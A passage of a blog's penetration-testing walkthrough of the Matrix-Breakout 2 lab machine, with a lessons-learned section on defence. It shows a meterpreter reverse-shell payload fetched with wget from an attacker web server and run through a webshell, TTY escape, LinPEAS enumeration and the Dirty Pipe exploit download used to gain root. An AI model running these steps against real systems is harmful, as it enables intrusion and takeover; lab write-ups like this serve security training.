+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set payload linux/x64/meterpreter_reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit
+</span></span></code></pre></div>  <img src="/images/m2_msf_multihandler1.png" alt="screenshot" width="100%"/>
+<p>Multi/Handler is now ready to ready to receive connection.</p>
+</li>
+</ul>
+<h2 id="file-transfer">File Transfer</h2>
+<ul>
+<li>
+<p>Creating the <code>shell.elf</code> file through MSFVenom is only useful if we can transfer it onto the victim device. To do this, we will create a web server to host the file and then download it onto the victim machine.</p>
+</li>
+<li>
+<p>Python Webserver</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 -m http.server
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div>  <img src="/images/m2_python_webserverpage.png" alt="screenshot" width="100%"/>
+</li>
+<li>
+<p>Using the webshell, download the file from the target machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://192.168.56.107:8000/shell.elf
+</span></span></code></pre></div>  <img src="/images/m2_webshell_download.png" alt="screenshot" width="100%"/>
+</li>
+<li>
+<p>Then, verify that file has been downloaded.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -l
+</span></span></code></pre></div>  <img src="/images/m2_webshell_downloaded.png" alt="screenshot" width="100%"/>
+</li>
+</ul>
+<h2 id="the-shell">The shell</h2>
+<ul>
+<li>
+<p>In preparation for executing the file, it is necessary to modify its permission settings in Linux using the <code>chmod</code> command. Setting the file permission to <code>777</code> grants read, write, and execute access to all users on the system, ensuring that the file can be executed by any user account including the one that will be running the reverse shell payload. Failure to set the appropriate file permissions may result in the payload not functioning as intended.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> shell.elf
+</span></span></code></pre></div>  <img src="/images/m2_webshell_chmod.png" alt="screenshot" width="100%"/>
+</li>
+<li>
+<p>Execute the payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.shell/elf
+</span></span></code></pre></div>  <img src="/images/m2_webshell_execute.png" alt="screenshot" width="100%"/>
+</li>
+<li>
+<p>Assuming that you are following the same steps, you should receive a connection in the meterpreter session that was created earlier.
+<img src="/images/m2_shellobtained.png" alt="screenshot" width="100%"/></p>
+</li>
+</ul>
+<h2 id="tty-escape">TTY Escape</h2>
+<ul>
+<li>
+<p>In some situations, TTY escape is necessary for interacting with the shell, particularly when dealing with interactive commands like password prompts. Without it, commands may not execute properly, or they may produce no response or blank output.</p>
+</li>
+<li>
+<p>There are various ways to perform TTY escape, but for this particular case, we&rsquo;ll be using Python.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div>  <img src="/images/m2_shell1.png" alt="screenshot" width="100%"/>
+<p>Note: Just search for <code>tty escape cheat sheet</code> on your favorite search engine.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<ul>
+<li>
+<p>Privilege escalation is the process of exploiting security vulnerabilities or misconfigurations to gain higher-level access than what was initially intended. This provides attackers with greater control over system resources and sensitive data. It&rsquo;s often used by malicious actors to gain administrative or root-level access to a system, enabling them to perform unauthorized actions and continue to compromise the system&rsquo;s security.</p>
+<h2 id="gathering-information">Gathering Information</h2>
+<ul>
+<li>
+<p>Now that we have shell access, our next step is to determine the privileges of the captured account and identify any misconfigurations or vulnerabilities that can be exploited to escalate our privileges.</p>
+</li>
+<li>
+<p>Upon checking, I discovered that the account in question does not have access to the <code>/etc/shadow</code> file, but can access the <code>/etc/passwd</code> file. This is a normal behavior for any account.
+<img src="/images/m2_shell2.png" alt="screenshot" width="100%"/></p>
+</li>
+</ul>
+<h3 id="nginx">Nginx</h3>
+<ul>
+<li>Nginx is a web server software that is known for its high performance and ability to handle large amounts of web traffic.</li>
+<li>Earlier, we discovered that the nginx service was running on port <code>81</code>, and upon visiting the nginx folder, we found a <code>.htpasswd</code> file that contained the user credentials for the service.</li>
+<li><code>.htpasswd</code> -&gt; <code>cypher:$apr1$e9o8Y7Om$5zgDW6WOO6Fl8rCC7jpvX0</code>
+<img src="/images/m2_shell3.png" alt="screenshot" width="100%"/></li>
+</ul>
+<h3 id="user-flag">User Flag</h3>
+<ul>
+<li>The user flag, which was located in the root directory, was easily accessible using this account.
+<img src="/images/m2_shell4.png" alt="screenshot" width="100%"/></li>
+</ul>
+<h2 id="linpeas">LinPEAS</h2>
+<ul>
+<li>
+<p>Since I didn&rsquo;t find any useful information manually, I will use <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>, a script that searches for misconfigurations and vulnerabilities in a Linux system to identify any potential avenues for privilege escalation.</p>
+</li>
+<li>
+<p>Get LinPEAS directly from its original creators on GitHub by downloading it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+</span></span></code></pre></div>  <img src="/images/m2_shell5_linpeas.png" alt="screenshot" width="100%"/>
+</li>
+<li>
+<p>Next, transfer the downloaded LinPEAS script to the victim machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; upload /home/kali/Desktop/linpeas.sh 
+</span></span></code></pre></div><p>and make it executable</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@morpheus:~/html$ chmod <span style="color:#ae81ff">777</span> linpeas.sh
+</span></span></code></pre></div>  <img src="/images/m2_shell5_linpeasupload.png" alt="screenshot" width="100%"/>
+</li>
+<li>
+<p>Run LinPEAS</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@morpheus:~/html$ ./linpeas.sh
+</span></span></code></pre></div><p>Note: Due to the lengthy output, a screenshot has not been provided.</p>
+</li>
+<li>
+<p>After running LinPEAS on the victim machine, I discovered that it may be susceptible to <code>CVE-2022-2588</code> and <code>CVE-2022-0847</code> vulnerabilities.</p>
+  <img src="/images/m2_CVE.png" alt="screenshot" width="100%"/>
+<p>Note: Linpeas is a tool that is commonly used for privilege escalation in Linux environments. It is designed to search for common misconfigurations and vulnerabilities that can be exploited to escalate privileges.</p>
+</li>
+</ul>
+<h2 id="dirty-pipe">Dirty Pipe</h2>
+<ul>
+<li>
+<p><code>CVE-2022-0847</code> is also known as <strong>Dirty Pipe</strong> and fully explained in this <a href="https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847#:~:text=DirtyPipe%20is%20a%20local%20privilege,any%20file%20under%20certain%20conditions">article</a>. from <a href="https://www.hackthebox.com/">HTB</a>. And this same blog post led me to the GitHub source code for an <a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">exploit</a>.</p>
+</li>
+<li>
+<p>To use the exploit, we must download it first.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
+</span></span></code></pre></div><img src="/images/m2_shell_exploitdownload.png" alt="screenshot" width="100%"/>
+</li>
+<li>
+<p>Upload <code>exploit.c</code> to the victim machine
+<img src="/images/m2_shell6_uploadexploit.png" alt="screenshot" width="100%"/></p>
+</li>
+<li>
+<p>Compile <code>exploit.c</code> it using gcc
+<img src="/images/m2_shell7_compileexploit.png" alt="screenshot" width="100%"/></p>
+<h3 id="root-flag">Root Flag!</h3>
+<ul>
+<li>
+<p>When running the exploit, an error may occur, but if you switch to the <code>root</code> user and use the provided password, you can gain <code>root</code> access to the system.
+<img src="/images/m2_shell8_rootuser.png" alt="screenshot" width="100%"/></p>
+</li>
+<li>
+<p>From here, it&rsquo;s simply a matter of navigating to locate the root flag.
+<img src="/images/m2_shell9_rootflag.png" alt="screenshot" width="100%"/></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<br/>
+<h1 id="conclusion">Conclusion</h1>
+<h2 id="summary">Summary</h2>
+<p>In this blog post, we have walked through the process of conducting a penetration testing exercise on a vulnerable machine using various tools and techniques. We started with scanning the machine with Nmap, and then moved on to using DirBuster to identify hidden directories and files. We also created a webshell and a reverse shell payload using MSFVenom, and used Metasploit&rsquo;s multi handler to receive the reverse shell.</p>
+<p>Once we had a shell on the machine, we performed privilege escalation by checking for misconfigurations and vulnerabilities that could be exploited to elevate our privileges. We used LinPEAS to automate the privilege escalation process and found that the machine was potentially vulnerable to CVE-2022-2588 and CVE-2022-0847. We then used an exploit found on GitHub to gain root access to the machine and retrieve the root flag.</p>
+<h2 id="lessons-learned">Lessons learned</h2>
+<ul>
+<li>Penetration testing is a critical component of any organization&rsquo;s security strategy, as it helps identify vulnerabilities and weaknesses in their systems and processes.</li>
+<li>Web applications are a common entry point for attackers, and it is important to regularly test and secure them against potential exploits.</li>
+<li>Privilege escalation is a common technique used by attackers to gain administrative access to a system, and should be a focus of any security testing effort.</li>
+<li>Using readily available tools and scripts, such as Metasploit and LinPEAS, can greatly simplify the process of conducting a penetration testing exercise.</li>
+<li>Regularly applying security updates and patches can help prevent many common vulnerabilities from being exploited.</li>
+<li>Overall, the key takeaway from this exercise is the importance of maintaining a strong security posture and continually testing and improving it over time.</li>
+</ul>
+<p>Overall, this exercise demonstrates the importance of proactive security measures and the need for continuous testing and improvement of our security defenses.</p>
+
+  <hr>
+<div class="footer">
+    
+	    
+            
+	            <a class="previous-post" href="/posts/matrix2/?ref=footer">« MATRIX-BREAKOUT 2</a>
+	        
+        
+	    
+    
+</div>
+
+</div>
+            </main>
+            
+  <div class="article-toc " >
+    <div class="toc-wrapper">
+      <h4>Contents</h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#setup">Setup</a></li>
+    <li><a href="#nmap">Nmap</a>
+      <ul>
+        <li><a href="#network-sweep">Network Sweep</a></li>
+        <li><a href="#port-scanning">Port Scanning</a></li>
+        <li><a href="#verify-port-scanning-results">Verify Port Scanning Results</a></li>
+      </ul>
+    </li>
+    <li><a href="#dirbuster">Dirbuster</a>
+      <ul>
+        <li><a href="#settings">Settings</a></li>
+        <li><a href="#results">Results</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#burpsuite">Burpsuite</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#web-shell">Web Shell</a></li>
+    <li><a href="#msfvenom">MSFVenom</a></li>
+    <li><a href="#metasploit">Metasploit</a></li>
+    <li><a href="#file-transfer">File Transfer</a></li>
+    <li><a href="#the-shell">The shell</a></li>
+    <li><a href="#tty-escape">TTY Escape</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#gathering-information">Gathering Information</a>
+      <ul>
+        <li><a href="#nginx">Nginx</a></li>
+        <li><a href="#user-flag">User Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#linpeas">LinPEAS</a></li>
+    <li><a href="#dirty-pipe">Dirty Pipe</a>
+      <ul>
+        <li><a href="#root-flag">Root Flag!</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#lessons-learned">Lessons learned</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+
+        </div>
+    </body>
+</html>
